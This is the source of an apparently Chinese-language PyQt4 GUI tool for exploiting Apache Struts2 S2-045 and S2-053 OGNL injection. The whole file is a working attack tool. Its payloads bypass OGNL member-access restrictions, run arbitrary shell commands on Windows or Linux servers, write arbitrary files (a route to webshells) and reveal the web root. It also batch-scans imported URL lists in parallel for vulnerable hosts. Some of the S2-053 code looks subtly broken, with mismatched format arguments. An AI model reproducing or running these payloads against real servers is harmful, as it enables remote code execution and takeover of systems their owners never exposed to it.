# -*- coding: utf-8 -*-

from ui import Ui_MainWindow,_translate,_fromUtf8
from PyQt4 import QtCore, QtGui
import requests
import sys,threading

class Ognl(object):
    dm = "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"

    mb = "(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"

    md = "(#c='{cmd}').(#i=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#md=(#i?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c}))"

    ps = "(#ps=new java.lang.ProcessBuilder(#md))(#ps.redirectErrorStream(true)).(#pr=#ps.start()).(#rs=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#pr.getInputStream(),#rs)).(#rs.flush())"

    fw = "(#fw=new java.io.FileWriter(new java.io.File(new java.lang.StringBuilder('{path}')))).(#fw.write('{content}')).(#fw.flush()).(#fw.close())"

    rs = "(#rs=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#rs)).(#rs.flush())"

    def __init__(self,base=''):
        self.base = base
        self.payload = []

    def make(self,it='.'):
        return self.filter(it.join(self.payload))

    @classmethod
    def filter(self,s):
        return s


class StrutsBase(object):
    method = "STRUTS"
    req = requests.Session()
    proxies = {}
    auth = ()
    timeout = 60
    url = None
    webpath = None
    headers = {
        'Cookie'    : 'STRUTS-Cookie',
        'User-Agent': 'STRUTS-Ua',
        'Accept'    : 'text/html',
        'Connection': 'close'
    }

    def __init__(self):
        self.data    = {}

    def set_data(self,k,v):
        self.data[k] = v

    @classmethod
    def set_header(self,k,v):
        self.headers[k] = v

    def send(self,url=None,data=None,headers=None,ref=True):
        if ref:self.headers['Referer'] = url
        return self.req.post(
                url = url if url else self.url,
                data = data if data else self.data,
                headers = headers if headers else self.headers,
                proxies = self.proxies,
                auth = self.auth,
                timeout = self.timeout,
                verify=False)

    def poc(self,url=None):
        return
    def exp(self,cmd):
        return 'exp'
    def upload(self,path,content='testst2',encoding='UTF-8'):
        return
    def getpath(self):
        return 'getpath'


class Struts2045(StrutsBase):
    def poc(self,url=None):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#r=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#r.println('STRUTStest'+20+45))"
            ".(#r.close())}")
        self.set_header('Content-Type',payload)
        res = self.send(url=url).text
        return 'STRUTStest2045' in res

    def exp(self,cmd):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#c='"+cmd+"')"
            ".(#i=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
            ".(#s=(#i?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c}))"
            ".(#p=new java.lang.ProcessBuilder(#s))"
            ".(#p.redirectErrorStream(true)).(#process=#p.start())"
            ".(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r))"
            ".(#r.flush())}")
        self.set_header('Content-Type',payload)
        return self.send().text

    def exp1(self,cmd):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
            ".(#o=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
            ".(#o.getExcludedPackageNames().clear())"
            ".(#o.getExcludedClasses().clear())"
            ".(#context.setMemberAccess(#dm))))"
            ".(#cmd='"+cmd+"')"
            ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
            ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
            ".(#p=new java.lang.ProcessBuilder(#cmds))"
            ".(#p.redirectErrorStream(true)).(#process=#p.start())"
            ".(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r))"
            ".(#r.flush())}")
        self.set_header('Content-Type',payload)
        return self.send().text

    def upload(self,path,content,encoding='UTF-8'):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#f=new java.io.FileWriter(new java.io.File(new java.lang.StringBuilder('"+path+"'))))"
            ".(#f.write('"+content+"'))"
            ".(#f.flush())"
            ".(#f.close())"
            ".(#w.print('STRUTStest'+20+45)"
            ".(#w.close()))}")
        self.set_header('Content-Type',payload)
        res = self.send().text
        return 'STRUTStest2045' in res

    def upload1(self,path,content,encoding='UTF-8'):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
            ".(#o=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
            ".(#o.getExcludedPackageNames().clear())"
            ".(#o.getExcludedClasses().clear())"
            ".(#context.setMemberAccess(#dm))))"
            ".(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#f=new java.io.FileWriter(new java.io.File(new java.lang.StringBuilder('"+path+"'))))"
            ".(#f.write('"+content+"'))"
            ".(#f.flush())"
            ".(#f.close())"
            ".(#w.print('STRUTStest'+20+45)"
            ".(#w.close()))}")
        self.set_header('Content-Type',payload)
        res = self.send().text
        return 'STRUTStest2045' in res

    def getpath(self):
        payload = ("%{(#nike='multipart/form-data')"
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#r=@org.apache.struts2.ServletActionContext@getRequest().getRealPath('/'))"
            ".(#o.println(#r))"
            ".(#o.close())}")
        self.set_header('Content-Type',payload)
        res = self.send().text
        return res.strip()

class Struts2053(StrutsBase):
    """%25{(%23dm=@ogn1.OgnIContext@DEFAULT_MEMBER_ACCESS).(%23_memberAccess?(%23_memberAccess=%23dm):((%23container=%23context ['com.opensymphony.xwork2.ActionContext.container'])(%23ogn1util=%23container.getInstance(@com.opensymphony.xwork2.ogn1.ognlUtil@class) ).(%23ogn1Util.getExcludedPackageNames().clear()).(%23ogn1Util.getExcludedClasses( ).clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd='whoami').(%23cmds={'cmd.exe','/c',%23cmd}).(%23p=new java.lang.ProcessBuilder(%23cmds))(%23p.redirectErrorStream(true)).(%23process=%23p.start()).(%23ins=%23process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(%23ins,'UTF-8'))}"""

    def poc(self,url=None):
        payload = ("%{987654321-1234567}")
        url = "?redirectUri=%s"%(url,payload)
        res = self.send(url=url).text
        return '986419754' in res

    def exp(self,cmd):
        payload = ("%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#c='"+cmd+"')"
            ".(#i=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
            ".(#s=(#i?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c}))"
            ".(#p=new java.lang.ProcessBuilder(#s))"
            ".(#p.redirectErrorStream(true)).(#process=#p.start())"
            ".(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))"
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r))"
            ".(#r.flush())}").replace('%','%25').replace('#','%23')
        url = "?redirectUri=%s"%(url,payload)
        res = self.send(url=url).text
        return 'STRUTStest2053' in res

    def upload(self,path,content,encoding='UTF-8'):
        payload = ("%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#f=new java.io.FileWriter(new java.io.File(new java.lang.StringBuilder('"+path+"'))))"
            ".(#f.write('"+content+"'))"
            ".(#f.flush())"
            ".(#f.close())"
            ".(#w.print('STRUTStest'+20+53)"
            ".(#w.close()))}").replace('%','%25').replace('#','%23')
        url = "?=redirectUri=%s"%(url,payload)
        res = self.send(url=url).text
        return 'STRUTStest2053' in res

    def getpath(self):
        payload = ("%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
            ".(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))"
            ".(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())"
            ".(#r=@org.apache.struts2.ServletActionContext@getRequest().getRealPath('/'))"
            ".(#o.println(#r))"
            ".(#o.close())}").replace('%','%25').replace('#','%23')
        url = "?redirectUri=%s"%(url,payload)
        res = self.send(url=url).text
        return 'STRUTStest2053' in res

class QIterThread(QtCore.QThread):
    def __init__(self):
        QtCore.QThread.__init__(self)
        self.Queue   = []
        self.threads = 10
        self.timeout = 10
        self.__FLAG  = True   #stop
        self.__STAT  = False  #pause
    def run(self):
        if self.Queue and self.handler:
            self.__FLAG  = True
            self.__STAT  = False
            Qiter = iter(self.Queue)
            while self.__FLAG:
                __ = []
                if self.__STAT:
                    self.sleep(1)
                    continue
                for _ in range(self.threads):
                    try:
                        data = next(Qiter)
                    except StopIteration:
                        self.__FLAG = False
                        break
                    _Q = threading.Thread(target=self.handler,args=(data,))
                    __.append(_Q)
                for _ in __:
                    _.start()

    def stop(self):
        self.__FLAG = False
        self.__STAT = False

    def pause(self):
        self.__STAT = not self.__STAT

    def setup(self,**kwargs):
        for k,v in kwargs.items():
            setattr(self,k,v)

class EventHandler(QtGui.QMainWindow,Ui_MainWindow):
    @QtCore.pyqtSlot(str)
    def on_lineEdit_url_textChanged(self,event):
        if not str(event).startswith(('http','HTTP')):
            event='http://%s'%event
        StrutsBase.url = event
        self.updatestatus(u'更改URL地址为%s'%event)

    @QtCore.pyqtSlot(bool)
    def on_pushButton_info_clicked(self,event):
        if StrutsBase.url:
          self.text_info.setText('')
          for name,mod in self.mods.items():
            self.updatestatus(u'正在测试是否存在%s漏洞。'%name)
            if mod.poc():
                self.curmod = mod
                self.text_info.insertPlainText(u'发现%s漏洞!!!系统确定为%s漏洞模式.！\n'%(name,name))
            else:
                self.text_info.insertPlainText(u'未发现%s漏洞\n'%name)
          self.updatestatus(u'')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_cmd_clicked(self,event):
        if self.curmod:
            self.text_cmd.setText(self.curmod.exp(self.lineEdit_cmd.text()))
        else:
            self.updatestatus(u'请先确定使用的漏洞模式')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_allload_clicked(self,event):
        folder = QtGui.QFileDialog.getOpenFileName(None,u"选择导入的地址文件",'',"*.*")
        if folder:
           self.treeWidget.clear()
           inFile = QtCore.QFile(folder)
           if inFile.open(QtCore.QIODevice.ReadOnly):
              stream = QtCore.QTextStream(inFile)
              i = 1
              while not stream.atEnd():
                  line = stream.readLine()
                  item = QtGui.QTreeWidgetItem()
                  item.setText(0,str(i))
                  item.setText(1,_fromUtf8(line))
                  item.setText(2,_fromUtf8(u'待验证'))
                  self.treeWidget.addTopLevelItem(item)
                  i += 1
           self.lineEdit_all.setText(folder)
           self.updatestatus(u'文件导入成功')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_alltest_clicked(self,event):
        item = QtGui.QTreeWidgetItemIterator(self.treeWidget)
        items = []
        while item.value():
            items.append(item.value())
            item = item.__iadd__(1)
        #多线程
        self.allverify.setup(Queue = items,handler=self.allverify_event)
        self.allverify.start()
        self.updatestatus(u'开始批量验证')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_allstop_clicked(self,event):
        self.allverify.stop()
        self.updatestatus(u'停止批量验证')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_allexport_clicked(self,event):
        item = QtGui.QTreeWidgetItemIterator(self.treeWidget)
        csv = []
        while item.value():
            csv.append(','.join([item.value().text(0),item.value().text(1),item.value().text(2)]))
            item = item.__iadd__(1)
        filename = QtGui.QFileDialog.getSaveFileName(None,u"保存文件",'',"*.csv")
        if filename:
            with open(filename,'w') as f:
                f.write('\n'.join(csv))
                f.close()
            self.updatestatus(u'文件导出成功。%s'%filename)

    @QtCore.pyqtSlot(QtGui.QTreeWidgetItem,int)
    def on_treeWidget_itemDoubleClicked(self,item,i):
        url = str(item.text(1)).strip()
        self.lineEdit_url.setText(url)
        StrutsBase.url = url
        self.updatestatus(u'选择URL地址%s'%url)

    @QtCore.pyqtSlot(bool)
    def on_pushButton_getpath_clicked(self,event):
        if self.curmod:
            self.lineEdit_upload.setText(self.curmod.getpath())
        else:
            self.updatestatus(u'请先确定使用的漏洞模式')

    @QtCore.pyqtSlot(bool)
    def on_pushButton_upload_clicked(self,event):
        if self.curmod:
            path = self.lineEdit_upload.text()
            path = str(path).strip().replace('\\','/')
            content = self.text_upload.toPlainText()
            if self.curmod.upload(path,content):
                self.updatestatus(u'上传成功')
            else:
                self.updatestatus(u'上传失败')
        else:
            self.updatestatus(u'请先确定使用的漏洞模式')
    @QtCore.pyqtSlot(str)
    def on_comboBox_mod_activated(self,event):
        if event in self.mods.keys():
            self.curmod = self.mods[str(event)]
            self.updatestatus(u'手动切换为%s漏洞模式'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_proxyhost_textChanged(self,event):
        host = self.lineEdit_proxyhost.text()
        port = self.lineEdit_proxyport.text()
        StrutsBase.proxies = {'http':'http://%s:%s'%(host,port),'https':'http://%s:%s'%(host,port)}
        self.updatestatus(u'更改代理地址为%s'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_proxyport_textChanged(self,event):
        host = self.lineEdit_proxyhost.text()
        port = self.lineEdit_proxyport.text()
        StrutsBase.proxies = {'http':'http://%s:%s'%(host,port),'https':'http://%s:%s'%(host,port)}
        self.updatestatus(u'更改代理端口为%s'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_authname_textChanged(self,event):
        name = self.lineEdit_authname.text()
        pwd = self.lineEdit_authpwd.text()
        StrutsBase.auth = (name,pwd)
        self.updatestatus(u'更改认证用户为%s'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_authpwd_textChanged(self,event):
        name = self.lineEdit_authname.text()
        pwd = self.lineEdit_authpwd.text()
        StrutsBase.auth = (name,pwd)
        self.updatestatus(u'更改认证密码为%s'%event)

    @QtCore.pyqtSlot()
    def on_plainTextEdit_cookie_textChanged(self):
        event = self.plainTextEdit_cookie.toPlainText()
        StrutsBase.set_header('Cookie',event)
        self.updatestatus(u'更改COOKIE为%s'%event)

    @QtCore.pyqtSlot(str)
    def on_lineEdit_ua_textChanged(self,event):
        StrutsBase.set_header('User-Agent',event)
        self.updatestatus(u'更改UA头为%s'%event)

    @QtCore.pyqtSlot(int)
    def on_spinBox_threads_valueChanged(self,event):
        self.allverify.setup(threads=event)
        self.updatestatus(u'更改线程数为%s'%event)

class GuiMain(EventHandler):
    signal_status = QtCore.pyqtSignal(str)
    def __init__(self):
        super(EventHandler, self).__init__()
        self.setupUi(self)
        self.treeWidget.header().setResizeMode(QtGui.QHeaderView.ResizeToContents)
        #禁止最大化
        self.setWindowFlags(QtCore.Qt.WindowMinimizeButtonHint)
        #禁止拉伸窗口
        self.setFixedSize(self.width(), self.height())

        self.signal_status.connect(self.updatestatus)
        self.mods = {}
        self.curmod = None
        for i,mod in enumerate(StrutsBase.__subclasses__()):
            self.mods[mod.__name__] = mod()
            self.comboBox_mod.addItem(_fromUtf8(mod.__name__))
        self.allverify = QIterThread()
        #QtCore.QMetaObject.connectSlotsByName(self)

    def updatestatus(self,msg):
        self.statusBar.showMessage(msg)

    def allverify_event(self,item):
        try:
           url = item.text(1)
           item.setText(2,_fromUtf8(u'未发现漏洞'))
           for name,mod in self.mods.items():
               if mod.poc(url=str(url).strip()):
                  item.setText(2,'%s'%name)
                  item.setBackgroundColor(0,QtGui.QColor("#ff0000"))
                  item.setBackgroundColor(1,QtGui.QColor("#ff0000"))
                  item.setBackgroundColor(2,QtGui.QColor("#ff0000"))
        except Exception as e:
            self.updatestatus(str(e))

def main():
   app = QtGui.QApplication(sys.argv)
   mainWindow = GuiMain()
   mainWindow.show()
   sys.exit(app.exec_())
main()